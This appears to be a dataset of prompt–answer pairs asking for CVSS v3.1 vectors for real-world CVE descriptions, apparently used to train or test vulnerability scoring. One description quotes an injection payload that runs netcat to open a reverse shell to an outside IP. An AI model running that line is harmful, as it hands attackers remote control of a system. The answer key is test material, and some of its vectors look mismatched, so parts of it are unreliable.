Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in webvitaly iframe allows Stored XSS.This issue affects iframe: from n/a through 4.8. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: This vulnerability exist in Skyworth Router CM5100, version 4.1.1.24, due to insufficient validation of user supplied input for the DDNS Password parameter at its web interface.  A remote attacker could exploit this vulnerability by supplying specially crafted input to the parameter at the web interface of the vulnerable targeted system.  Successful exploitation of this vulnerability could allow the attacker to perform stored XSS attacks on the targeted system. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross-Site Request Forgery (CSRF) vulnerability in Icegram Icegram Engage – WordPress Lead Generation, Popup Builder, CTA, Optins and Email List Building.This issue affects Icegram Engage – WordPress Lead Generation, Popup Builder, CTA, Optins and Email List Building: from n/a through 3.1.18. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in naa986 Easy Video Player allows Stored XSS.This issue affects Easy Video Player: from n/a through 1.2.2.10. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Dell EMC AppSync, versions from 4.2.0.0 to 4.6.0.0 including all Service Pack releases, contain an exposure of sensitive information vulnerability in AppSync server logs. A high privileged remote attacker could potentially exploit this vulnerability, leading to the disclosure of certain user credentials. The attacker may be able to use the exposed credentials to access the vulnerable system with privileges of the compromised account. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability has been reported in Cups Easy (Purchase & Inventory), version 1.0, whereby user-controlled inputs are not sufficiently encoded, resulting in a Cross-Site Scripting (XSS) vulnerability via /cupseasylive/grnmodify.php, in the grndate parameter. Exploitation of this vulnerability could allow a remote attacker to send a specially crafted URL to an authenticated user and steal their session cookie credentials. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability classified as critical has been found in code-projects Online Faculty Clearance 1.0. This affects an unknown part of the file delete_faculty.php of the component HTTP GET Request Handler. The manipulation of the argument id leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-250569 was assigned to this vulnerability. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Bref enable serverless PHP on AWS Lambda. When Bref is used with the Event-Driven Function runtime and the handler is a `RequestHandlerInterface`, then the Lambda event is converted to a PSR7 object. During the conversion process, if the request is a MultiPart, each part is parsed and its content added in the `$files` or `$parsedBody` arrays. The conversion process produces a different output compared to the one of plain PHP when keys ending with and open square bracket ([) are used. Based on the application logic the difference in the body parsing might lead to vulnerabilities and/or undefined behaviors. This vulnerability is patched in 2.1.13. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An origin validation vulnerability in the Trend Micro Apex One security agent could allow a local attacker to escalate privileges on affected installations.  Please note: an attacker must first obtain the ability to execute low-privileged code on the target system in order to exploit this vulnerability.  This vulnerability is similar to, but not identical to, CVE-2023-47195. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Input Validation in Hitron Systems DVR HVR-16781 1.03~4.02 allows an attacker to cause network attack in case of using defalut admin ID/PW. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An OS command injection vulnerability has been reported to affect QuMagie. If exploited, the vulnerability could allow authenticated users to execute commands via a network.  We have already fixed the vulnerability in the following version: QuMagie 2.2.1 and later 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Nextcloud files Zip app is a tool to create zip archives from one or multiple files from within Nextcloud. In affected versions users can download "view-only" files by zipping the complete folder. It is recommended that the Files ZIP app is upgraded to 1.2.1, 1.4.1, or 1.5.0. Users unable to upgrade should disable the file zip app. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Tenda AX1803 v1.0.0.1 contains a stack overflow via the iptv.city.vlan parameter in the function getIptvInfo. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A cross-site scripting (XSS) vulnerability in Task Manager App v1.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the Note Section parameter at /TaskManager/Tasks.php. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue was discovered in REDAXO version 5.15.1, allows attackers to execute arbitrary code and obtain sensitive information via modules.modules.php. 	CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. 	CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Transmit requests in Xen's virtual network protocol can consist of multiple parts.  While not really useful, except for the initial part any of them may be of zero length, i.e. carry no data at all.  Besides a certain initial portion of the to be transferred data, these parts are directly translated into what Linux calls SKB fragments.  Such converted request parts can, when for a particular SKB they are all of length zero, lead to a de-reference of NULL in core networking code. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in Novel-Plus 4.3.0-RC1 and classified as critical. This issue affects some unknown processing of the file /novel/bookComment/list. The manipulation of the argument sort leads to sql injection. The exploit has been disclosed to the public and may be used. The identifier VDB-252185 was assigned to this vulnerability. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A flaw was found in the Linux kernel's memory deduplication mechanism. The max page sharing of Kernel Samepage Merging (KSM), added in Linux kernel version 4.4.0-96.119, can create a side channel. When the attacker and the victim share the same host and the default setting of KSM is "max page sharing=256", it is possible for the attacker to time the unmap to merge with the victim's page. The unmapping time depends on whether it merges with the victim's page and additional physical pages are created beyond the KSM's "max page share". Through these operations, the attacker can leak the victim's page. 	CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In the Linux kernel, the following vulnerability has been resolved:  pmdomain: mediatek: fix race conditions with genpd  If the power domains are registered first with genpd and *after that* the driver attempts to power them on in the probe sequence, then it is possible that a race condition occurs if genpd tries to power them on in the same time. The same is valid for powering them off before unregistering them from genpd. Attempt to fix race conditions by first removing the domains from genpd and *after that* powering down domains. Also first power up the domains and *after that* register them to genpd. 	CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Cross Site Scripting (XSS) vulnerability in JFinalcms 5.0.0 allows attackers to run arbitrary code via the name field when creating a new custom table. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An issue was discovered in open5gs v2.6.6. InitialUEMessage, Registration request sent at a specific time can crash AMF due to incorrect error handling of Nudm_UECM_Registration response. 	CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability was found in MiczFlor RPi-Jukebox-RFID up to 2.5.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file userScripts.php of the component HTTP Request Handler. The manipulation of the argument folder with the input ;nc 104.236.1.147 4444 -e /bin/bash; leads to os command injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251540. NOTE: The vendor was contacted early about this disclosure but did not respond in any way. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Authentication Bypass by Capture-replay vulnerability in Mitsubishi Electric Corporation MELSEC WS Series WS0-GETH00200 all serial numbers allows a remote unauthenticated attacker to bypass authentication by capture-replay attack and illegally login to the affected module. As a result, the remote attacker who has logged in illegally may be able to disclose or tamper with the programs and parameters in the modules. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: The PayHere Payment Gateway WordPress plugin before 2.2.12 automatically creates publicly-accessible log files containing sensitive information when transactions occur. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in realmag777 WPCS – WordPress Currency Switcher Professional allows Stored XSS.This issue affects WPCS – WordPress Currency Switcher Professional: from n/a through 1.2.0. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x and Ivanti Policy Secure allows a remote attacker to access restricted resources by bypassing control checks. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Missing Integrity Check in Shelly TRV 20220811-152343/v2.1.8@5afc928c allows malicious users to create a backdoor by redirecting the device to an attacker-controlled machine which serves the manipulated firmware file. The device is updated with the manipulated firmware. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A vulnerability, which was classified as critical, has been found in ForU CMS up to 2020-06-23. Affected by this issue is some unknown functionality of the file cms_admin.php. The manipulation of the argument a_name leads to sql injection. The exploit has been disclosed to the public and may be used. The identifier of this vulnerability is VDB-251552. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Jinja is an extensible templating engine. Special placeholders in the template allow writing code similar to Python syntax. It is possible to inject arbitrary HTML attributes into the rendered HTML template, potentially leading to Cross-Site Scripting (XSS). The Jinja `xmlattr` filter can be abused to inject arbitrary HTML attribute keys and values, bypassing the auto escaping mechanism and potentially leading to XSS. It may also be possible to bypass attribute validation checks if they are blacklist-based. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') vulnerability in WP Event Manager WP User Profile Avatar allows Stored XSS.This issue affects WP User Profile Avatar: from n/a through 1.0. 	CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: In Plotly plotly.js before 2.25.2, plot API calls have a risk of __proto__ being polluted in expandObjectPaths or nestedProperty. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: A improper neutralization of formula elements in a csv file in Fortinet FortiClientEMS version 7.2.0 through 7.2.2, 7.0.0 through 7.0.10, 6.4.0 through 6.4.9, 6.2.0 through 6.2.9, 6.0.0 through 6.0.8 allows attacker to execute unauthorized code or commands via specially crafted packets. 	CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
Analyze the following CVE description and output the CVSS v3.1 Base vector string. Do not explain your reasoning. Output only the vector string and nothing else.  Valid options for each metric: - Attack Vector (AV): N, A, L, P - Attack Complexity (AC): L, H - Privileges Required (PR): N, L, H - User Interaction (UI): N, R - Scope (S): U, C - Confidentiality (C): N, L, H - Integrity (I): N, L, H - Availability (A): N, L, H  Output format (exactly this, no other text): CVSS:3.1/AV:_/AC:_/PR:_/UI:_/S:_/C:_/I:_/A:_  CVE Description: PrestaShop Op'art Easy Redirect >= 1.3.8 and <= 1.3.12 is vulnerable to SQL Injection via Oparteasyredirect::hookActionDispatcher(). 	CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
